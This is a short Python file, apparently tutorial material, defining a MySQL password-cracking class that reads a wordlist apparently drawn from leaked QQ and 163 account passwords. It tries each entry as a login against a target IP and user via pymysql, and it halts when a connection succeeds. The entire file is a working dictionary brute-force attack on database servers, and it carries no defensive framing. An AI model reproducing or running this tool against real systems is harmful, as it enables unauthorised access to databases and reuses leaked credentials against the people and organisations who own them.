import pymysql  # 安装  pip  install  pymysql
import codecs


class MySQLCrack:
    def __init__(self, ip, user):
        filepath = r"C:\Users\Tsinghua-yincheng\Desktop\day16down\tools\qqAnd163Password.txt"
        self.file = codecs.open(filepath, "rb", "gbk", "ignore")  # 打开文件
        self.ip = ip
        self.user = user

    def startcrack(self, showview):  # showview是 Listshowdata
        while True:
            line = self.file.readline()
            linelist = line.split(" # ")
            mystr = self.crack(linelist[0])
            print(mystr)  # 处理密码
            showview.addata(mystr)  # 显示数据,加上数据
            if mystr.find("正确") != -1:
                break
            if not line:
                break

    def crack(self, password):
        isOK = False
        try:
            db = pymysql.connect(self.ip, self.user, password)
            db.close()

        except pymysql.err.OperationalError:
            isOK = False
        else:
            isOK = True
        if isOK:
            return "密码正确" + password
        else:
            return "密码错误" + password

    def __del__(self):
        self.file.close()
